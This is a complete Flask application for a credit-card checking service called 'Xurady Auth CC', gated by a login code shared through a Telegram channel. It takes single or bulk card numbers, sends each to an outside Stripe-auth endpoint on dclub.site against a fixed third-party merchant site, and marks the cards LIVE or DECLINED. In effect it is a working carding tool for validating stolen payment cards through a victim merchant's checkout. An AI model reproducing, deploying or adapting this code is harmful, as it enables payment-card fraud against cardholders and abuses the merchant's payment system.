from flask import Flask, render_template_string, request, redirect, session, jsonify
import requests, json, time

app = Flask(__name__)
app.secret_key = "change-this-secret-key"

# ================= CONFIG =================
TELEGRAM_SECRET_CODE = "UNOOC-2026"
API_URL = "http://dclub.site/apis/stripe/auth/st7.php"
FIXED_SITE = "southendschoolwear.com"
# =========================================


# ================= LOGIN =================
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xurady Auth</title>
<style>
:root{
    --bg:#0f2027; --card:#1b2a33; --text:#fff;
    --input:#000000cc; --border:#ffffff88; --accent:#00f260;
}
@media (prefers-color-scheme: light){
:root{--bg:#eef2f3;--card:#fff;--text:#000;--input:#fff;--border:#00000044;}
}
*{box-sizing:border-box}
body{
margin:0;background:var(--bg);height:100vh;display:flex;
justify-content:center;align-items:center;font-family:system-ui;color:var(--text)
}
.box{width:100%;max-width:380px;padding:22px;border-radius:22px;background:var(--card)}
h2{text-align:center}
a{display:block;text-align:center;margin-bottom:14px;color:var(--accent);text-decoration:none;font-weight:600}
input{
width:100%;padding:15px;border-radius:14px;border:2px solid var(--border);
background:var(--input);color:var(--text);font-size:16px
}
input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px #00f26044}
button{
width:100%;padding:15px;margin-top:14px;border:none;border-radius:16px;
background:linear-gradient(90deg,#00f260,#0575e6);color:#fff;font-weight:700
}
.error{text-align:center;color:#ff5c5c;margin-top:10px}
</style>
</head>
<body>
<div class="box">
<h2>🔐 Secure Access</h2>
<a href="https://t.me/unooc" target="_blank">📢 Join Telegram Channel</a>
<form method="POST">
<input name="code" placeholder="Enter Telegram Login Code" required>
<button>Verify & Login</button>
</form>
{% if error %}<div class="error">{{ error }}</div>{% endif %}
</div>
</body>
</html>
"""

@app.route("/login", methods=["GET","POST"])
def login():
    error=None
    if request.method=="POST":
        if request.form.get("code")==TELEGRAM_SECRET_CODE:
            session["logged_in"]=True
            return redirect("/")
        error="Invalid code"
    return render_template_string(LOGIN_HTML,error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

def login_required():
    return session.get("logged_in")


# ================= MAIN APP =================
HTML = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xurady Auth</title>
<style>
:root{
--bg:#0f2027;--card:#1b2a33;--text:#fff;
--input:#000000cc;--border:#ffffff88;--accent:#00f260
}
@media (prefers-color-scheme: light){
:root{--bg:#eef2f3;--card:#fff;--text:#000;--input:#fff;--border:#00000044}
}
*{box-sizing:border-box}
body{
margin:0;background:var(--bg);min-height:100vh;
display:flex;justify-content:center;align-items:center;
font-family:system-ui;color:var(--text)
}
.container{
width:100%;max-width:420px;padding:22px;margin:14px;
border-radius:22px;background:var(--card)
}
h2{text-align:center}

.tabs{
display:flex;border-radius:14px;overflow:hidden;margin-bottom:10px;
background:#00000055
}
.tab{
flex:1;padding:12px;text-align:center;cursor:pointer;
transition:.2s
}
.tab.active{
background:linear-gradient(90deg,#00f260,#0575e6);
color:#fff;font-weight:700
}

input,textarea{
width:100%;padding:15px;margin-top:12px;border-radius:14px;
border:2px solid var(--border);background:var(--input);
color:var(--text);font-size:15.5px;caret-color:var(--accent)
}
textarea{height:130px;resize:none;font-family:monospace}
input:focus,textarea:focus{
outline:none;border-color:var(--accent);
box-shadow:0 0 0 3px #00f26044
}

button{
width:100%;padding:15px;margin-top:16px;border:none;
border-radius:16px;background:linear-gradient(90deg,#00f260,#0575e6);
color:#fff;font-weight:700;font-size:16px
}

.result{
margin-top:14px;padding:12px;border-radius:16px;
background:#00000066
}
.item{padding:10px;border-radius:12px}
.live{color:#00ff9c}
.dead{color:#ff5c5c}
.processing{color:#4dd2ff}

.spinner{
width:14px;height:14px;border:2px solid #4dd2ff55;
border-top:2px solid #4dd2ff;border-radius:50%;
display:inline-block;margin-right:6px;
animation:spin 1s linear infinite
}
@keyframes spin{to{transform:rotate(360deg)}}

.hidden{display:none}
.footer{text-align:center;font-size:12px;margin-top:10px;opacity:.7}
</style>
</head>
<body>

<div class="container">
<h2>💳 Xurady Auth CC</h2>

<div class="tabs">
<div id="tabSingle" class="tab active" onclick="showSingle()">Single</div>
<div id="tabMass" class="tab" onclick="showMass()">Mass</div>
</div>

<!-- SINGLE -->
<div id="singleBox">
<input id="singleInput" placeholder="Enter Card Details">
<button onclick="startSingle()">Check Card</button>
<div id="singleResult" class="result hidden"></div>
</div>

<!-- MASS -->
<div id="massBox" class="hidden">
<textarea id="mass_ccs" placeholder="Enter CCs (one per line)"></textarea>
<button onclick="startMass()">Start Mass Check</button>
<div id="massResult" class="result hidden"></div>
</div>

<div class="footer">
 Xurady Xyz • <a href="/logout" style="color:var(--accent);text-decoration:none">Logout</a>
</div>
</div>

<script>
function setActive(tab){
tabSingle.classList.remove("active");
tabMass.classList.remove("active");
tab.classList.add("active");
}

function showSingle(){
singleBox.classList.remove("hidden");
massBox.classList.add("hidden");
setActive(tabSingle);
}

function showMass(){
massBox.classList.remove("hidden");
singleBox.classList.add("hidden");
setActive(tabMass);
}

// ---------- SINGLE CHECK ----------
async function startSingle(){
let cc=singleInput.value.trim();
if(!cc) return;

singleResult.classList.remove("hidden");
singleResult.innerHTML=
'<div class="item processing"><span class="spinner"></span><strong>PROCESSING</strong> — '+cc+'</div>';

let res=await fetch("/check_one",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cc})});
let d=await res.json();

singleResult.innerHTML=
'<div class="item '+d.cls+'"><strong>'+d.status+'</strong> — '+d.cc+'<br><small>'+d.msg+'</small></div>';
}

// ---------- MASS CHECK ----------
async function startMass(){
massResult.innerHTML="";
massResult.classList.remove("hidden");
let lines=mass_ccs.value.split("\\n").map(x=>x.trim()).filter(Boolean);

while(lines.length){
let cc=lines.shift();
mass_ccs.value=lines.join("\\n");

let row=document.createElement("div");
row.className="item processing";
row.innerHTML='<span class="spinner"></span><strong>PROCESSING</strong> — '+cc;
massResult.appendChild(row);

let res=await fetch("/check_one",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cc})});
let d=await res.json();

row.className="item "+d.cls;
row.innerHTML='<strong>'+d.status+'</strong> — '+d.cc+'<br><small>'+d.msg+'</small>';
}
}
</script>

</body>
</html>
"""

def check_cc(cc):
    try:
        r=requests.get(API_URL,params={"site":FIXED_SITE,"cc":cc},timeout=15)
        d=json.loads(r.text)
        s=d.get("status","").lower()
        m=d.get("message","")
        if "approved" in s: return {"cc":cc,"status":"LIVE","msg":m,"cls":"live"}
        if "declined" in s: return {"cc":cc,"status":"DECLINED","msg":m,"cls":"dead"}
        return {"cc":cc,"status":"ERROR","msg":m,"cls":"dead"}
    except Exception as e:
        return {"cc":cc,"status":"ERROR","msg":str(e),"cls":"dead"}

@app.route("/",methods=["GET"])
def index():
    if not login_required(): return redirect("/login")
    return render_template_string(HTML)

@app.route("/check_one",methods=["POST"])
def check_one():
    if not login_required(): return jsonify({"error":"unauthorized"}),401
    cc=request.json.get("cc")
    time.sleep(1)
    return jsonify(check_cc(cc))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
